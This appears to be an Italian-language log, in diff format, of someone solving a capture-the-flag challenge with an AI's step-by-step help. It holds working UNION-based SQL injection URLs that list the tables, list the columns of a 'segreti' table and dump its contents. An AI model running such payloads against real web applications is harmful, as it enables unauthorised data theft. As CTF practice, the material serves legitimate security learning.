@@ -1,0 +1,41 @@
+1) 
+ho questa http://10.8.0.27:32001/check?q=1 e sto facendo una ctf ho QUERY: SELECT id, nome FROM utenti_pubblici WHERE id = 1
+
+==================================================
+
+id | nome
+
+---------------------------------
+
+1 | Mario Rossi  cosa devo caombiare nell'url? cosa cercare su gemini
+
+response = http://10.8.0.27:32001/check?q=-1%20UNION%20SELECT%201,group_concat(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%23
+
+2)
+ho travo questo QUERY: SELECT id, nome FROM utenti_pubblici WHERE id = -1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()#
+
+==================================================
+
+id | nome
+
+---------------------------------
+
+1 | items,segreti,users,utenti_pubblici cosa devo fare? da fare a gemini
+
+response = Modifica l'URL così (cambia il valore di q): ?q=-1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='segreti'%23
+
+3) 
+ho trovato questo QUERY: SELECT id, nome FROM utenti_pubblici WHERE id = -1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='segreti'#
+
+==================================================
+
+id | nome
+
+---------------------------------
+
+1 | id,titolo,valore come devo andare avanti? domanda
+
+response = Copia e incolla questo nell'URL dopo q=: -1%20UNION%20SELECT%20id,%20valore%20FROM%20segreti%23
+
+4)
+Complimenti! Hai completato la Capture The Flag.
